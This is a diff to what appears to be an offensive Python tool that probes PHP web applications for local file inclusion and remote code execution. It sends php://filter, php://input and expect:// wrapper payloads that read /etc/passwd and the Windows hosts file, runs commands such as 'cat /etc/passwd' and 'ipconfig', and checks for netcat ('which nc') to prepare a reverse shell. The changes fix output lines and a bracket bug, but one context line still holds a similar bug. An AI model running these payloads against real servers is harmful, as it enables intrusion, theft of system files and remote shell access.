@@ -9,9 +9,6 @@ import random
 import argparse
 import requests
 import requests.exceptions
-import base64
-import http.server
-import socketserver
 
 from argparse import RawTextHelpFormatter
 
@@ -124,7 +121,7 @@ def test_php_filter(url):
         if(checkPayload(res)):
             tempUrl = u.replace('/etc/passwd', 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
-            print("[+] LFI -> " + tempUrl)
+            print("[+] LFI -> " + u)
     
     #Windows
     for i in range(len(testW)):
@@ -139,7 +136,7 @@ def test_php_filter(url):
         if(checkPayload(res)):
             tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
-            print("[+] LFI -> " + tempUrl)
+            print("[+] LFI -> " + u)
 
 
 def test_data_wrapper(url):
@@ -210,7 +207,7 @@ def test_php_input(url):
             except:
                 print("Proxy problem... Exiting.")
                 sys.exit(-1)
-
+            
             if(checkPayload(res)):
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                 tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
@@ -261,7 +258,7 @@ def test_expect_wrapper(url):
         if(checkPayload(res)):
             tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
-            print("[+] RCE -> " + tempUrl)
+            print("[+] RCE -> " + u)
 
     #Windows
     for j in range(len(testW)):
@@ -277,7 +274,7 @@ def test_expect_wrapper(url):
         if(checkPayload(res)):
             tempUrl = u.replace('ipconfig', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
-            print("[+] RCE -> " + tempUrl)
+            print("[+] RCE -> " + u)
     
     if(args.revshell):
         exploit(exploits, 'EXPECT')
@@ -364,7 +361,7 @@ def exploit(exploits, method):
                 return
 
 
-        elif(exploit['ATTACK_METHOD' == method and method == 'EXPECT']):
+        elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
                 u = url.replace('TMP', 'which%20nc')
@@ -393,8 +390,6 @@ def main():
         test_data_wrapper(url)
         test_expect_wrapper(url)
         test_rfi(url)
-        
-
         test_wordlist(url)
         
         print("Done.")
